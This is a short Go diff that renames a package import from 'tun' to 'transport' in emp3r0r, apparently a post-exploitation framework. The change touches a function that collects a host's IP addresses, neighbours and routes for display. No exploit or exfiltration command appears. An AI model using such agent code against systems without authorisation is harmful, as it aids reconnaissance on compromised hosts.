@@ -7,14 +7,14 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func shellNet() (out string) {
-	ipa := tun.IPa()
-	ipneigh := tun.IPNeigh()
-	ipr := tun.IPr()
+	ipa := transport.IPa()
+	ipneigh := transport.IPNeigh()
+	ipr := transport.IPr()
 
 	out = fmt.Sprintf("[*] ip addr:\n    %s"+
 		"\n\n[*] ip route:\n    %s"+
